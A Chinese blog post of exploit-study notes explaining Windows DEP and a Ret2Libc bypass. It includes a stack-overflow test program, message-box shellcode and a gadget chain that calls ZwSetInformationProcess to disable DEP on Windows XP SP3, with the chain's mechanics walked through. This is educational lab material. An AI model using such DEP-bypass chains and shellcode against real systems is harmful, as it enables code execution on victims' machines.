---
title: 漏洞学习笔记-014-DEP的介绍
description: Windows的DEP保护和简单的攻击方法
date: 2020-11-19 12:42:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

本文来源：[Moeomu的博客](/zh-cn/posts/漏洞学习笔记-014-dep的介绍/)

## DEP的介绍

> 溢出攻击的根源是未准确区分数据和代码，但是重新设计计算机结构是不太可能的事情，所以使用各种办法去减缓溢出攻击

### 原理

- 将数据所在的内存页标为不可执行，而程序成功溢出进入shellcode时，CPU将会抛出执行异常
- DEP分为软件DEP和硬件DEP，而软件DEP指的是SafeSEH，硬件DEP在AMD平台上称为No-Execute Page-Protection(NX)，Intel平台上称为Execute Disable Bit(XD)
- 操作系统通过设置内存页的NX和XD标记，来指明不能从此执行代码，PageTable中插入一个标记来标识此页是否运行执行指令，0表示允许，1表示不允许

### DEP的工作状态

- Optin：允许系统组件和服务使用DEP，其它程序将不予保护，而用户可以通过ACT工具标记程序使用DEP，这种保护可以被程序动态关闭，多用于普通用户操作系统
- Output：为排除列表外的程序启用DEP，多用于服务器操作系统
- AlwaysOn：对所有的程序应用DEP保护，不可被关闭，只有64位操作系统才使用此模式
- AlwaysOff：一般不用

### 编译选项

> `/NXCOMPAT`编译选项将在PE头中设置`IMAGE_DLLCHARACTERISTICS_ NX_COMPAT`标识，位于`IMAGE_OPTIONAL_HEADER`中的`DllCharacteristics`，此值为`0x100`时表示启用DEP

## 利用Ret2Libc挑战DEP

### 原理

- DEP保护时溢出失败的原因是DEP检测到代码在非可执行页上执行，如果让程序直接跳转到一个已存在的系统函数中，必然不会被拦截
- `Ret2Libc`是`Return-to-libc`的简写，如果将每条exploit都找到一条在系统lib中的替代品，那么此exp一定可以正确执行，但问题在于不是每条指令都不包含0，不断的跳转容易跳错地方
- 以下是三个可行的方法
  - 跳转到`ZwSetinfomationProcess`函数将DEP关闭，转入shellcode执行
  - 跳转到`VirtualProtect`将shellcode页面设为可执行，随后转入shellcode执行
  - 跳转到`VirtualAlloc`申请一段可执行的内存空间随后跳入shellcode执行

### 尝试ZwSetinfomationProcess关闭DEP

#### 前置内容

- 一个进程的DEP标识存在于`KPROCESS`结构的`_KEXECUTE_OPTION`上，可以通过API函数修改

> `_KEXECUTE_OPTION`结构

```cpp
Pos0ExecuteDisable:1bit
Pos1ExecuteEnable:1bit
Pos2DisableThunkEmulation:1bit
Pos3Permanent:1bit
Pos4ExecuteDispatchEnable:1bit
Pos5ImageDispatchEnable:1bit
Pos6Spare:2bit
```

- 当前进程DEP开启的时候，`ExecuteDisable`将会被设置为1
- 当前进程DEP关闭的时候，`ExecuteEnable`将会被设置为1
- `DisableThunkEmulation`为了兼容ATL被设置
- `Permanent`被置1后表示这些标志都不能再被修改
- 我们只要将`_KEXECUTE_OPTIONS`的值设置为`0x02(00000010)`就可以将`ExecuteEnable`置为1

#### shellcode原理

- `LdrpCheckNXCompatibility`函数为了检查DEP兼容性，满足以下条件之一将可以关闭DEP
  - DLL受SafeDisc版权保护系统保护
  - DLL中含有`.aspack`，`.pcle`，`.sforce`等字节的时候
  - DLL存在于注册表声明的不需启用DEP的模块的时候`HKEY_LOCAL_MACHINE\SOFTWARE \Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions`

#### 代码

> 测试环境：系统：Windows XP SP3，DEP状态：Optout，编译器：VC6，编译选项：禁用优化，版本：release

```cpp
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;

ZwSetInformationProcess(
    NtCurrentProcess(),     // Handle(-1)
    ProcessExecuteFlags,    //0x22
    &ExecuteFlags,          // ptr to 0x2
    sizeof(ExecuteFlags)    //0x4
);
```

```cpp
#include <string.h>
#include <windows.h>

char shellcode[] =
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x52\xE2\x92\x7C" // mov eax, 1
"\x96\x73\x1B\x5D" // mov ebp, esp & esp+8
"\x1E\xAD\x17\x5D" // esp+0x24
"\xB4\xC1\xC5\x7D" // jmp esp
"\x90\x90\x90\x90"
"\x24\xCD\x93\x7C" // call Close DEP
"\x90\x90\xE9\x2D" // jmp to shellcode start
"\xFF\xFF\xFF\x90"
;

void test()
{
    char tt[176];
    strcpy(tt,shellcode);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();

    return 0;
}
```

#### 技术细节

- 需要对比al是否为1，所以第一步retn将会返回到`mov eax, 1`，`retn`的地址，此地址将会返回到修缮ebp的位置
- 因为在调用函数之前，会访问ebp中的值，但是它已经被刷写掉了，所以将修缮ebp，在此使用了`push esp`，`pop ebp`，`retn`三条指令将esp中的地址赋值给ebp，由于retn后面跟着数字，因此ebp将会加上这个数字，也就是`ebp+8`，此时ebp小于esp了，一旦调用子程序将会对栈区进行破坏，所以依旧得将ebp再加上一些，我在此选择将esp加上0x24，与之前的0x8凑成了0x30的栈空间，这样在返回的时候将会返回到语句`retn 0x24`
- `retn 0x24`语句在返回的时候将会返回到调用关闭DEP的函数`ZwSetInformationProcess`的地方，调用完毕后将会使用leave语句并retn，因此它将会返回到`jmp esp`的地址处
- 由`jmp esp`跳转到`\x24\xCD\x93\x7C`数据存放的地址处，而此垃圾数据将不会影响shellcode的执行
- 在垃圾数据的后方写入一个跳转即可，至此跳到shellcode真实执行之处
